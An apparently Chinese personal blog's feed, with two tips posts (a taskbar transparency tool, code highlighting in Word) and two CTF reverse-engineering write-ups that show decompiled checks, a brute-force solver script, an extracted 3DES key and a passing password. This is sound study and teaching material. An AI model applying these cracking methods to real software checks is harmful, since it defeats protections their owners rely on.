    <link href="https://mrh1s.top/posts/36dd5647/"/>
    <id>https://mrh1s.top/posts/36dd5647/</id>
    <published>2019-06-07T16:19:11.000Z</published>
    <updated>2019-06-08T03:57:07.794Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="TranslucentTB"><a href="#TranslucentTB" class="headerlink" title="TranslucentTB"></a>TranslucentTB</h2><blockquote><p>win10的界面可谓比win7、xp高到不知道哪里去了，然而事物总是有两面性，win10任务栏一直是我们所诟病的一个东西</p></blockquote><blockquote><p>A lightweight utility that makes the Windows taskbar translucent/transparent.</p></blockquote><p><a href="https://github.com/TranslucentTB/TranslucentTB" target="_blank" rel="noopener">TranslucentTB</a></p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><strong>半透明</strong></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/08/5cfa920826a9d62322.png" alt="Snipaste_2019-06-08_00-32-03.png"></p><p><strong>全透明</strong></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/08/5cfa92082ed1c37164.png" alt="Snipaste_2019-06-08_00-31-36.png"></p><h3 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h3><blockquote><p>看起来现在加了不少功能</p><p>主要的还是改变任务栏透明度</p></blockquote><ul><li><p>Advanced <strong>color picker</strong> supporting alpha and live preview to change the taskbar’s color.</p></li><li><p>Taskbar states</p><p>(choose one - color can be customized on every state except Normal):</p><ul><li><strong>Blur</strong>: Will make the taskbar slightly blurred. <strong>半透明</strong></li><li><strong>Clear</strong>: Transparent taskbar. <strong>全透明</strong></li><li><strong>Normal</strong>: Regular Windows style. (as if TranslucentTB was not running)  </li><li><strong>Opaque</strong>: No transparency.</li><li><strong>Fluent</strong>: Windows 10 April 2018 update and up only. Will give the taskbar an appearance similar to Microsoft’s Fluent Design guidelines.</li></ul></li><li><p>Dynamic</p><p>modes (these can be used together and each of them provides a taskbar state and color you can customize):</p><ul><li><strong>Dynamic Windows</strong>: Will change the taskbar to a different appearance if a window is currently maximised.</li><li><strong>Dynamic Start Menu</strong>: Will change the taskbar appearance when the start menu is opened.</li><li><strong>Dynamic Cortana</strong>: Will change the taskbar appearance when Cortana (or the search menu if Cortana is disabled) is open.</li><li><strong>Dynamic Timeline/Task View</strong>: Will change the taskbar apperance when the Timeline (or Task View on older builds) is open.</li></ul></li><li><p>Ability to <strong>show or hide the Aero Peek</strong> button. Can be customized <strong>at will</strong> or <strong>dynamic</strong>.</p></li></ul><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ol><li><a href="https://www.microsoft.com/store/apps/9PF4KZ2VN4W9" target="_blank" rel="noopener">Microsoft Store</a> （最近添加的）</li><li><a href="https://github.com/TranslucentTB/TranslucentTB/releases" target="_blank" rel="noopener">the releases tab</a>（zip压缩包）</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
  </entry>
  
  <entry>
    <title>在word中贴出漂亮的代码</title>
    <link href="https://mrh1s.top/posts/472395fb/"/>
    <id>https://mrh1s.top/posts/472395fb/</id>
    <published>2019-06-07T16:12:28.000Z</published>
    <updated>2019-06-07T16:18:16.445Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><blockquote><p>如果你正在写word的实验报告，而苦于word的代码显示错位，那你就来对地方了！</p></blockquote><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ol><li>打开这个网页<a href="http://www.planetb.ca/syntax-highlight-word" target="_blank" rel="noopener">PlanetB</a>;</li><li>谷歌搜索<strong>syntax highlight code in word documents</strong>，检索结果的第一个</li></ol><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>​    打开网页，把需要的代码粘贴进去，然后show highlighted即可</p><p>​    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
  </entry>
  
  <entry>
    <title>qwb_JustRe</title>
    <link href="https://mrh1s.top/posts/2946351e/"/>
    <id>https://mrh1s.top/posts/2946351e/</id>
    <published>2019-05-26T02:43:14.000Z</published>
    <updated>2019-06-13T16:12:46.924Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="JustRe"><a href="#JustRe" class="headerlink" title="JustRe"></a>JustRe</h1><p><a href="\uploads\JustRe.7z">JustRe.7z</a> </p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>程序读入了26位 十六进制数</p><p>其中前8为送入eax寄存器</p><p>把eax扩展为了16个字节 01234567012345670123456701234567 记作 <strong>input</strong></p><p>后两位（假设为ab） 填充为了ababababababababab…..ababab，记作 <strong>ab</strong></p><p>从内存中取16个字节，记作 <strong>key1</strong></p><p>还从内存取了16个字节，形如00000003000000020000000100000000 记作 <strong>key2</strong></p><p>key = (ab + key1)^ (input + key2) 并且将结果存在原来key1的位置</p><p>依次循环</p><blockquote><p>注意key2第二次  key2’ +=  key2 ，而不是直接从内存取</p></blockquote><p>接下来的循环 循环了八次，是对从0x405058的32个字节进行处理，每次四个字节</p><p>同样</p><p><strong>input</strong> 01 23 45 67</p><p><strong>key</strong> 从内存中取四个字节</p><p><strong>ab</strong> 用89位填充的四个字节</p><p><strong>esi</strong> 从0x10 开始 一直到0x18</p><p>key =  (ab + key) ^ (input + esi) 并且将结果存在key的位置</p><p>然后 0x405018 和 0x404148的 0x60个字节进行比较，要相等</p><p>事实证明，后面这些运算，对于解出input的帮助并不大，我们只需要解出一组input，并且判断它们是否是四个分块都相等即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dec1 = <span class="number">0x4364162A031410D2EF95C26D80B899BD</span></span><br><span class="line">enc1 = <span class="number">0x405004A100000278EC81F0E483EC8B55</span></span><br><span class="line">key1 = <span class="number">0x00000003000000020000000100000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FILL</span><span class="params">(a)</span>:</span>  <span class="comment">#用八九位这一个字节去填充为16字节</span></span><br><span class="line">    <span class="keyword">return</span> a * <span class="number">0x01010101010101010101010101010101</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DIVIDE</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res.append((a &lt;&lt; (<span class="number">32</span> * i) &amp; <span class="number">0xffffffffffffffffffffffffffffffff</span>) &gt;&gt; (<span class="number">32</span> * <span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ADD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    a = DIVIDE(a)</span><br><span class="line">    b = DIVIDE(b)</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res += ((a[i]+b[i]) &amp; <span class="number">0xffffffff</span>) &lt;&lt; (<span class="number">32</span> * (<span class="number">3</span>-i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CALC</span><span class="params">(dec,enc,key,t)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (ADD(FILL(t),dec) ^ enc) - key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">100</span>):<span class="comment">#枚举第八第九位的所有情况</span></span><br><span class="line">    res = CALC(dec1,enc1,key1,t)</span><br><span class="line">    <span class="keyword">if</span>(inpu &amp; <span class="number">0xffffffff</span> == res &gt;&gt; (<span class="number">3</span> * <span class="number">32</span>)):</span><br><span class="line">        print(hex(CALC(dec1,enc1,key1,t) &gt;&gt; (<span class="number">3</span>*<span class="number">32</span>)),hex(t))</span><br></pre></td></tr></table></figure><blockquote><p>前十位 1324229810</p></blockquote><p>用来过验证的passwd：13242298100123456789abcdef</p><p>后面这个加密函数是好像藏在data区里面的，看起来应该是一个加密算法，谷歌了几个比较关键的常数，发现是个3des加密</p><p><a href="https://www.cnblogs.com/one--way/archive/2016/07/05/5643771.html" target="_blank" rel="noopener">https://www.cnblogs.com/one--way/archive/2016/07/05/5643771.html</a></p><p>密钥应该是这个 AFSAFCEDYCXCXACNDFKDCQXC</p><p>再配上解密后的密文（实际上只用到了16个字节，剩下的8个字节可要可不要）</p><p><strong>注意：大端序，不能直接复制，要先把顺序颠倒一下</strong></p><blockquote><p>轮子不太完整，修改了一下，以下是main函数中修改过的内容</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> k[<span class="number">32</span>] = <span class="string">"AFSAFCEDYCXCXACNDFKDCQXC"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">128</span>] = &#123;</span><br><span class="line">    <span class="number">0x50</span>,<span class="number">0x7C</span>,<span class="number">0xA9</span>,<span class="number">0xE6</span>,</span><br><span class="line">    <span class="number">0x87</span>,<span class="number">0x09</span>,<span class="number">0xCE</span>,<span class="number">0xFA</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0xD5</span>,<span class="number">0x0D</span>,<span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0x90</span>,<span class="number">0xBB</span>,<span class="number">0x97</span>,<span class="number">0x6C</span>,<span class="number">0</span></span><br><span class="line">&#125;;  <span class="comment">/* 原始明文 */</span></span><br><span class="line">nlen = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">8</span>) &#123;</span><br><span class="line">        DES_ecb3_encrypt((const_DES_cblock *)(src + i), (DES_cblock *)(out + i), &amp;ks1, &amp;ks2, &amp;ks3, DES_DECRYPT);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"encrypted Hex:"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02X"</span> , *(out + i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"encrypted Bin:"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, *(out + i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="qwb_ctf20190526" scheme="https://mrh1s.top/categories/write-up/qwb-ctf20190526/"/>
    
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="3des" scheme="https://mrh1s.top/tags/3des/"/>
    
  </entry>
  
  <entry>
    <title>rctf_babyre2</title>
    <link href="https://mrh1s.top/posts/8b232dcf/"/>
    <id>https://mrh1s.top/posts/8b232dcf/</id>
    <published>2019-05-21T12:29:34.000Z</published>
    <updated>2019-05-21T12:51:36.686Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Rctf-babyre2"><a href="#Rctf-babyre2" class="headerlink" title="Rctf_babyre2"></a>Rctf_babyre2</h1><p><a href="\uploads\rctf_babyre2.7z">rctf_babyre2</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="alarm"><a href="#alarm" class="headerlink" title="alarm"></a>alarm</h3><blockquote><p>程序一开头就有一个alarm函数，这会使我们在调试的时候中途退出，直接把call alarm nop掉即可</p></blockquote><h3 id="sub-55761565891A"><a href="#sub-55761565891A" class="headerlink" title="sub_55761565891A"></a>sub_55761565891A</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_55761565891A</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  print_notice();</span><br><span class="line">  <span class="built_in">memset</span>(a1, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, a1, <span class="number">0xFF</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">7</span> )</span><br><span class="line">      v2 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_notice();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    print_notice();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sub-5576156589CC"><a href="#sub-5576156589CC" class="headerlink" title="sub_5576156589CC"></a>sub_5576156589CC</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_5576156589CC</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  print_notice();</span><br><span class="line">  <span class="built_in">memset</span>(a1, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, a1, <span class="number">0xFF</span>uLL);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + i) &lt;= <span class="number">9</span> || *((_BYTE *)a1 + i) &gt; <span class="number">99</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          print_notice();</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      print_notice();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    print_notice();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的读入账户和密码，不赘述</p><blockquote><p>不赘述就出问题了</p><p>读密码的时候你没发现一个奇怪的事情吗？</p><p> if ( *((_BYTE *)a1 + i) &lt;= 9 || *((_BYTE *)a1 + i) &gt; 99 )</p><p>密码可以不是可见字符</p></blockquote><h3 id="sub-557615658ACE"><a href="#sub-557615658ACE" class="headerlink" title="sub_557615658ACE"></a>sub_557615658ACE</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">sub_557615658ACE</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+31h] [rbp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+35h] [rbp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+36h] [rbp-1Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+39h] [rbp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+3Dh] [rbp-13h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+3Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+3Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v25; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v8 = <span class="number">-8</span>;</span><br><span class="line">  v9 = <span class="number">-44</span>;</span><br><span class="line">  v10 = <span class="number">-43</span>;</span><br><span class="line">  v11 = <span class="number">-36</span>;</span><br><span class="line">  v12 = <span class="number">-55</span>;</span><br><span class="line">  v13 = <span class="number">-38</span>;</span><br><span class="line">  v14 = <span class="number">-49</span>;</span><br><span class="line">  v15 = <span class="number">-50</span>;</span><br><span class="line">  v16 = <span class="number">-41</span>;</span><br><span class="line">  v17 = <span class="number">-38</span>;</span><br><span class="line">  v18 = <span class="number">-49</span>;</span><br><span class="line">  v19 = <span class="number">-46</span>;</span><br><span class="line">  v20 = <span class="number">-44</span>;</span><br><span class="line">  v21 = <span class="number">-43</span>;</span><br><span class="line">  v22 = <span class="number">-56</span>;</span><br><span class="line">  v23 = <span class="number">-102</span>;</span><br><span class="line">  v24 = <span class="number">-79</span>;</span><br><span class="line">  dest = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1);</span><br><span class="line">  